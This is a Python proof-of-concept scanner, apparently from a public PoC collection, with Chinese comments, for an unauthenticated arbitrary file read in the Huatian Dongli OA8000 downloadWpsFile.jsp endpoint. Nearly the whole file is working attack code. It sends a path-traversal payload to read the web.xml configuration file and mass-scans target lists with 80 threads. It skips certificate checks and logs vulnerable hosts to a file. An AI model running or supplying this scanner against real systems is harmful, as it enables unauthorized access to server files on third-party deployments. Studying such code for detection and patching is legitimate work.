# 华天动力OA downloadWpsFile.jsp 任意文件读取漏洞
# app="华天动力-OA8000"
# 产品简介：华天动力OA是一款将先进的管理思想、 管理模式和软件技术、网络技术相结合，为用户提供了低成本、 高效能的协同办公和管理平台。
# 漏洞概述：华天动力OA downloadWpsFile.jsp 接口处存在任意文件读取漏洞，未经身份认证的攻击者可利用此漏洞获取服务器内部敏感文件，使系统处于极不安全的状态。

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
        \x1b[38m██╗  ██╗████████╗██████╗ ██╗       ██████╗  █████╗ 
        \x1b[36m██║  ██║╚══██╔══╝██╔══██╗██║      ██╔═══██╗██╔══██╗
        \x1b[34m███████║   ██║   ██║  ██║██║█████╗██║   ██║███████║
        \x1b[35m██╔══██║   ██║   ██║  ██║██║╚════╝██║   ██║██╔══██║
        \x1b[31m██║  ██║   ██║   ██████╔╝███████╗ ╚██████╔╝██║  ██║
        \x1b[33m╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚══════╝  ╚═════╝ ╚═╝  ╚═╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    --author:Kucei  --Version:华天动力OA_downloadWpsFile.jsp_任意文件读取漏洞 
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<                                                 
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('华天动力OA_downloadWpsFile.jsp_任意文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/OAapp/jsp/downloadWpsFile.jsp?fileName=../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'close',
    }
    try :
        response = requests.get(url=target+url_payload,headers=headers,verify=False,timeout=5)
        # print(response.status_code)
        # print(response.text)
        if response.status_code == 200 and 'encoding' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('华天动力OA_ReadingFile.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")

if __name__ == '__main__':
    main()